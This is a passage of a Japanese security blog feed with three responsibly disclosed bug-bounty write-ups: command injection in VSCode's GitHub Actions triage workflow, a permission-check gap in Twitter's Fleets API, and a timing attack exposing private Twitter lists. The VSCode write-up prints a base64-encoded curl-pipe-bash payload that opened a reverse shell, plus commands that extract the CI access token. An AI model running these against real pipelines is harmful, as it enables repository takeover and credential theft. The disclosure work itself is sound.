issue? \u0026lt;!-- \\closedWith `eval${IFS}$(echo${IFS}'Y3VybCAiaHR0cHM6Ly9yeTB0YWsuZ2l0aHViLmlvL3BheWxvYWRzL2Q1MGNmMWRmYjJlNzQ5Y2RhYTQ2ZjBiOGQ1ZGEzMzFkLnNoIiB8IGJhc2g='|base64${IFS}-d)` --\u0026gt;  このPayloadでは、curl https://ry0tak.github.io/payloads/d50cf1dfb2e749cdaa46f0b8d5da331d.sh | bashをBase64エンコードした物をデコードし、それをコマンドとして実行している。\n現在は削除されているが、このリンク先のスクリプトはリバースシェルを張るものだったため、このコマンドが実行された時点で任意の操作をGitHub Actions上で行えるようになっていた。\n次に、リバースシェルを張った後に実行するコマンドを考えた。\nactions/checkoutは、ローカルのGitリポジトリに対して適切に認証を行うための設定を自動で行う。\nそのため、そのリポジトリを利用して無害なファイルをプッシュするのが最も簡単で良いという結論に至り、以下のようなコマンドを実行することにした。\ncd repo git config --global user.name \u0026quot;Ry0taK\u0026quot; git config --global user.email \u0026quot;49341894+Ry0taK@users.noreply.github.com\u0026quot; echo -e \u0026quot;This is a PoC for my MSRC report. (No malicious intent here! This is not a phishing!)\\nIt would be appreciated if you don't delete the commit history until the MSRC team reviewed my report. (This is 'Reliable \u0026amp; minimized proof-of-concept' defined here: https://www.microsoft.com/en-us/msrc/bounty-example-report-submission)\\nIf you are a maintainer, please send me a message at Twitter (@ryotkak) with a proof of maintainer for quick fix.\u0026quot; \u0026gt; ryotak.txt git add ryotak.txt git commit -m \u0026quot;Add MSRC PoC\u0026quot; git push  最後に、脆弱性を突いた後すぐにMicrosoftへ報告できるように、予め脆弱性が突けたと仮定したレポートを作成し、コピペすればレポートが送信できる状態にしておいた。\n実行 23時20分(JST)に処理が走るため、23時15分ごろにコメントを追加した。15\nその後、23時41分になってワークフローが実行され16、リバースシェルが張られた。\nしかしながら、上記の手順でコマンドを実行した際に、masterブランチにブランチ保護がかかっているというエラーが出てしまった。\nそのため、慌てて以下のコマンドを実行しryotakブランチを新規に作成、プッシュした: https://github.com/microsoft/vscode/commit/2dadb25aeb01922fcc321ebba95bd0a95d12ec0a\ngit checkout -b ryotak git push -u origin ryotak  その後、ブランチ保護を回避する方法を探すために、以下のコマンドを実行してGitHub Access Tokenを抽出した。\nauth_conf=$(git config --get http.https://github.com/.extraheader)\tencoded=$(echo $auth_conf | sed s/\u0026quot;AUTHORIZATION: basic \u0026quot;//)\tdecoded=$(echo $encoded | base64 -d | sed s/\u0026quot;x-access-token:\u0026quot;// | tr -d '\\n') echo $decoded  このトークンを用いて、ブランチ保護を確認した所、masterブランチにはアカウントベースのマージ保護があり、ブランチ保護の回避は困難であることがわかった。\n他の重要そうなブランチを調査した結果、リリースブランチに対してはアカウントベースのマージ保護が存在せず、書き込みアクセスを持つユーザー1名以上のApproveがあればプルリクエストをマージできることが判明した。\nGitHub Actionsに付与されるトークンはgithub-actionsというBotユーザーのものであるため、プルリクエストのApproveを行うことができる。 これを用いることにより、リリースブランチに対して任意のコミットが出来ることを証明することができた: https://github.com/microsoft/vscode/pull/113596 まとめ 今回の記事は、CIのスクリプト内に存在した脆弱性を紹介しました。\nCIのスクリプトは、普段OSSの監査を行う際等にあまり気にしない箇所であったため、かなり印象的でした。\nまた、今回の脆弱性報告のプロセス中、Microsoft側の応答が非常に丁寧かつ迅速でとても好印象でした。\n実際には行いませんでしたが、リポジトリに対する書き込み権限があったため、新規バージョンのリリース等も実行できたのではないかな、と思っています。\n本記事に関する質問はTwitter(@ryotkak)へメッセージを投げてください。\nタイムライン    日付 出来事     2020/12/29 13時頃 コマンドインジェクションを発見   2020/12/29 14時頃 脆弱性が突けそうであることを確認   2020/12/29 18時頃 帰宅した後、準備を開始   2020/12/29 21時頃 諸々の準備を完了   2020/12/29 23:15 PayloadをIssueに書き込み   2020/12/29 23:41 GitHub Actions内からリバースシェルが張られる   2020/12/29 23:41 masterへプッシュできないことを確認   2020/12/29 23:45頃 GitHub Actionsのトークンを入手   2020/12/29 23:50頃 ブランチ保護に関する調査完了   2020/12/29 24時頃 脆弱性の影響範囲の特定   2020/12/29 24時頃 脆弱性の報告   2021/01/01 脆弱性の一時対応が完了   2021/01/05 脆弱性の修正が完了   2021/01/12 脆弱性の開示許可を求める   2021/01/12 脆弱性の開示許可が出る   2021/01/12 脆弱性の開示      https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L161 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/testbed.ts#L68-L70 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/db8d13b11082eb0d14a2b4fb5bc19d30f2531b4d/api/octokit.ts#L158\nhttps://github.com/microsoft/vscode-github-triage-actions/blob/0c3e4907d6516778ea95d7bb657b8eb5c44ac49d/api/api.ts#L21 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/release-pipeline/ReleasePipeline.ts#L49-L54\nhttps://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/author-verified/AuthorVerified.ts#L81-L84 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/0c3e4907d6516778ea95d7bb657b8eb5c44ac49d/author-verified/AuthorVerified.ts#L20\nhttps://github.com/microsoft/vscode-github-triage-actions/blob/0c3e4907d6516778ea95d7bb657b8eb5c44ac49d/release-pipeline/ReleasePipeline.ts#L21 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/author-verified/AuthorVerified.ts#L71-L84 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L402-L411 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L374 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/commands.json#L143-L154 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/release-pipeline-labeler.yml\nhttps://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/on-label.yml\nhttps://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/author-verified.yml \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/author-verified.yml \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/issues/113374 \u0026#x21a9;\u0026#xfe0e;\n https://docs.github.com/en/free-pro-team@latest/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token \u0026#x21a9;\u0026#xfe0e;\n https://github.com/actions/checkout/blob/61b9e3751b92087fd0b06925ba6dd6314e06f089/action.yml#L48-L50 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/issues/113374#issuecomment-752092722 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/actions/runs/450927894 \u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-01-12","permalink":"https://blog.ryotak.me/post/vscode-write-access/","tags":["Bug Bounty","脆弱性","Microsoft","VSCode","RCE"],"title":"VSCodeのGitHubリポジトリに対する不正なPushアクセス"},{"content":"はじめに TwitterはBug Bountyプログラム(脆弱性報奨金制度とも呼ばれる)を実施しており、脆弱性の診断行為を行うことが認められています。\n本記事は、そのプログラムを通して報告された脆弱性についてを解説したものであり、Twitterが認知していない未修正の脆弱性を公開する事を意図したものではありません。\nまた、Twitter上で脆弱性を発見した場合はTwitterのBug Bountyプログラムより報告してください。\n(This article is written in Japanese. If you\u0026rsquo;d like to read this article in English, please visit HackerOne report.)\nTL;DR Twitterが公開したフリート機能が使用しているAPIに脆弱性が存在し、READ権限しか持っていないサードパーティアプリケーションがフリートの作成や削除などを行えた。\n調査したきっかけ Twitterは2020年11月10日に、フリートと呼ばれる機能を日本に対して公開した。\n当初はiOS版のクライアントのみに実装されたが、翌日の11日には手元のAndroid端末にフリート機能用の更新が降ってきていたため、APIを解析してみることにした。\n解析 Twitter for Androidは通常のAndroidアプリと同じくJavaで書かれており、難読化はされているものの解析はそこまで難しくない。\nそのため、apktoolとdex2jar、CFRを用いてデコンパイルし、ある程度可読性が高い状態に戻した。(詳細なデコンパイル方法に関してはここでは触れないが、ググれば出てくるのでそちらを参照してほしい。)\nエンドポイント名がわからなければAPIを解析できないため、grepを用いてfleetという文字列が含まれる.javaファイルを検索し、/fleet/v1/user_fleetsという文字列が含まれるファイルを発見した。\nそのファイルと同じ階層にあるファイルを調べた所、他のエンドポイントと思わしき文字列が見つかったため、一旦それらを解析し、Gistにまとめた。\n検証中に\u0026hellip; その後、Gistの内容を精査している際に、サードパーティのアプリケーションとして認証している際にフリート関連のAPIを叩くと、問題なく動作することがわかった。\nこの事をドキュメントにまとめて公開すれば非公式クライアントの製作者の方が喜ぶのでは？と思い詳細なAPIドキュメントを書いた。\n公開する前にこのGistの内容が間違っていないか検証していた所、POST /fleets/v1/createに対して読み取り権限しか持たないアプリケーションとしてリクエストを送信した際に、フリートが作成されてしまっていることがわかった。\nこれは脆弱性なのか？ 最初は検証用アプリケーションに誤って書き込み権限を与えてしまったのだと思い、権限を確認したが、明らかに読み取り権限しか与えられていなかった。\nこの時点で、これは脆弱性なのでは？と思い始めたが、確証が得られなかったのでもう少し深く調査することにした。\nその結果、通常のTwitterのAPI(POST /1.1/statuses/update.json等)では、APIの処理が走る前に権限チェックをしていたが(当たり前だが)、どうやらフリート関連のエンドポイントは通常のAPIでは行われる権限チェックが行われていないことが判明した。\n$ twurl /1.1/statuses/update.json --header 'Content-Type: application/json' -d '{\u0026quot;status\u0026quot;:\u0026quot;Test\u0026quot;}' {\u0026quot;request\u0026quot;:\u0026quot;\\/1.1\\/statuses\\/update.json\u0026quot;,\u0026quot;error\u0026quot;:\u0026quot;Read-only application cannot POST.\u0026quot;} $ twurl /fleets/v1/create -X POST --header 'Content-Type: application/json' -d '{\u0026quot;text\u0026quot;:\u0026quot;Hey yo\u0026quot;}' {\u0026quot;fleet\u0026quot;:{\u0026quot;created_at\u0026quot;:\u0026quot;2020-11-12T12:29:16.180000000Z\u0026quot;,\u0026quot;deleted_at\u0026quot;:null,\u0026quot;expiration\u0026quot;:\u0026quot;2020-11-13T12:29:16.189235445Z\u0026quot;,\u0026quot;fleet_id\u0026quot;:\u0026quot;F1-328253875041691174\u0026quot;,\u0026quot;fleet_thread_id\u0026quot;:\u0026quot;T1-328253875041625638\u0026quot;,\u0026quot;mentions\u0026quot;:null,\u0026quot;mentions_str\u0026quot;:null,\u0026quot;read\u0026quot;:false,\u0026quot;text\u0026quot;:\u0026quot;Hey yo\u0026quot;,\u0026quot;user_id\u0026quot;:1195137762027962368},\u0026quot;fleet_thread_id\u0026quot;:\u0026quot;T1-328253875041625638\u0026quot;,\u0026quot;fleet_id\u0026quot;:\u0026quot;F1-328253875041691174\u0026quot;,\u0026quot;users\u0026quot;:null}  報告 脆弱性であることがわかったため、一旦フリート関連のAPIドキュメントの公開を見送り、Twitterに報告することにした。\n報告は11月12日に行ったのだが、11月18日(実際にはもう数日前だったのだと思う)には修正されており、非常に印象的な修正速度だった。\nしかしながら、残念なことにフリート関連のAPIがサードパーティのアプリケーションによって使用できていた事自体が問題だったようで、フリート関連のAPIをサードパーティのアプリケーションに叩かせないように変更することで修正されてしまった。\nその後 Twitterが脆弱性を修正した3日後、同じくフリートのAPIを解析してフリートの画像が24時間経った後もCDNから削除されない事をツイートしている人がおり、フリート機能の実装に使えた期間はとても短かったのかな、と少しTwitter内部の開発者がかわいそうになってしまった。\ni have also just confirmed that the media URLs don't expire after 24h, so you can view fleets after they're deleted\n— 波兰蠢驴 (@donk_enby) November 21, 2020  この脆弱性を発見する理由となったGistに関しては、[ここで公開](https://gist.github.com/Ry0taK/005b79eccb4297469a09696dae9fa3c6)しているので何かの役にたててほしい。 まとめ この一連の流れで、新機能を解析することの重要さと、どんな大企業でもミスはするという教訓を得ることが出来た。\nTwitterに報告した際の実際のレポートはここから見れるので是非読んでみてほしい。\nこのブログ記事に関して、なにか質問等がある場合はTwitter(@ryotkak)へDMを飛ばしてください。\nタイムライン    日付 出来事     2020/11/10 Twitterがフリート機能を日本向けにリリース   2020/11/11 手元の環境でフリート機能が使えるようになった   2020/11/12 脆弱性を発見、報告   2020/11/13 Twitter: 現在確認中   2020/11/14 Twitter: 脆弱性として認定   2020/11/18 Twitter: 脆弱性を修正   2020/12/15 Twitter: 報奨金額の決定   2021/01/05 脆弱性の開示    ","date":"2021-01-05","permalink":"https://blog.ryotak.me/post/twitter-privesc/","tags":["Twitter","脆弱性","Fleet","Privilege Escalation","Bug Bounty"],"title":"Twitterのフリート機能に対する権限昇格"},{"content":"はじめに TwitterはBug Bountyプログラム(脆弱性報奨金制度とも呼ばれる)を実施しており、脆弱性診断を行うことが認められています。\n本記事は、そのプログラムを通して報告された脆弱性についてを解説したものであり、インターネット上のサービスに無差別に攻撃する事を推奨するものではありません。\nまた、Twitter上で脆弱性を発見した場合は無闇に公開せず、TwitterのBug Bountyプログラムより報告してください。\n要約 不適切なアクセス制御とレートリミットの欠如、タイミング攻撃を組み合わせることによりTwitterの非公開リストの中身を閲覧できた。\n不適切なアクセス制御 TwitterのGraphQLエンドポイントに対して以下のようなリクエストを送信すると、リストが非公開であったとしてもリストのメンバーリストを取得することが出来た。\nGET /graphql/iUmNRKLdkKVH4WyBNw9x2A/ListMembers?variables=%7B%22listId%22%3A%22[ここにリストID]%22%2C%22count%22%3A20%2C%22withTweetResult%22%3Afalse%2C%22withUserResult%22%3Afalse%7D HTTP/1.1 Host: api.twitter.com User-Agent: [Redacted] Accept: */* Accept-Language: ja,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate content-type: application/json x-twitter-auth-type: OAuth2Session x-twitter-client-language: ja x-twitter-active-user: yes x-csrf-token: [Redacted] Origin: https://twitter.com authorization: Bearer [Redacted] Connection: close Cookie: [Redacted]  リストのIDが取得できれば非公開リストの内容が読み取れる状態だったので報告したが、Twitter曰く非公開リストのIDを取得するのは困難らしく、それを回避しない限り潜在的な脆弱性でしか無いと拒否されそうになった。1\nしかしながら、TwitterのIDはミリ秒単位のタイムスタンプ、Worker ID、データセンターID、ID衝突回避用の値で構成されており、そのうちID衝突回避用の値は0始まりで衝突するたびに加算されていく物で、かつデータセンターIDは基本的に10であるため、ミリ秒単位のタイムスタンプとWorker IDを推測することができれば実質的にIDがわかる。\n攻撃は現実的であるということを証明する必要があったため、更に調査することにした。\nレートリミットの欠如 非公開リストのIDを取得する方法を探していた際に、Twitter APIの一部のレートリミットが、ドキュメント上には存在すると書いてあるにも関わらず、実際には存在しないことがわかった。\nそれらのエンドポイントの一つにPOST /1.1/lists/destroy.jsonが存在した。\nこのエンドポイントは、リストを削除するためのエンドポイントなのだが、当然他人の非公開リストを削除しようとしたとしても404が帰ってくるだけだった。\nPOST /1.1/lists/destroy.json Content-Type: application/x-www-form-urlencoded Authorization: OAuth [Redacted] list_id=[ここにリストID]  タイミング攻撃 前述のエンドポイントを詳しく調べている際に、TwitterのAPIにリクエストを送った際に帰ってくるレスポンスのほぼ全てにx-response-timeというヘッダが存在していることがわかった。\n確認した所、このヘッダはTwitter API内部で処理にかかった時間を正確に返しているようだった。\nここまで露骨な前振りをされたらタイミング攻撃しか無いだろうということで試してみた所、他人の非公開リストの削除を試みた場合と存在しないリストの削除を試みた場合とでx-response-timeの値に～20程の差異が存在した。\nこれと前述のレートリミットの欠如を組み合わせることにより、非公開リストのIDを現実的な時間内で総当りすることが可能となり、それを報告した所無事にTwitterのセキュリティチームによりトリアージされた。\nまとめ Twitterのトリアージチームがこの脆弱性を調査している間、非公開リストのメンバーリストを取得できるのは「Bug Bountyプログラムで扱うほどのリスクではない」という返信が帰ってくるなど、拒否されそうになる場面が何度かあったが、根気良く説明した事により脆弱性として認められた。\n一度拒否することが確定した物2でも、セキュリティ上の問題が明確なものに関してはなぜ問題なのかを説明することが重要で、それによって一転して脆弱性であると認めることがあるため、今後Twitterに脆弱性を報告する人はその点を留意したほうが良いかもしれない。\nタイムライン    日付 出来事     2020/5/29 脆弱性を報告   2020/5/30 Twitter: 更に情報が必要   2020/5/30 追加の情報を送信   2020/6/1 Twitter: 更に情報が必要   2020/6/2 追加の情報を送信   2020/6/2 Twitter: 内部調査中   2020/6/6 Twitter: 脆弱性として認定   2020/6/24 Twitter: 報奨金額の決定   2020/8/1 Twitter: 脆弱性を修正   2020/8/4 脆弱性の開示      後のレポートでIDを取得することは容易であるとTwitterチームが認めたが、直近のレポートでもトリアージチームはIDを取得する方法が無いという理由で拒否しようとしてくる。 \u0026#x21a9;\u0026#xfe0e;\n 例として、限定公開のコンテンツのURLが推測出来るということを報告したらそれは脆弱性ではなく仕様であるとされたことや、非公開ツイートの一部データが取得できる事を報告したらそれはBug Bountyプログラムで扱うほどのリスクではないとされたこと等がある。 \u0026#x21a9;\u0026#xfe0e;\n   ","date":"2020-10-09","permalink":"https://blog.ryotak.me/post/twitter-list-chain/","tags":["Twitter","脆弱性","IDOR","Brute Force","Timing Attack","Bug Bounty"],"title":"Twitterの非公開リストが見れた話"}]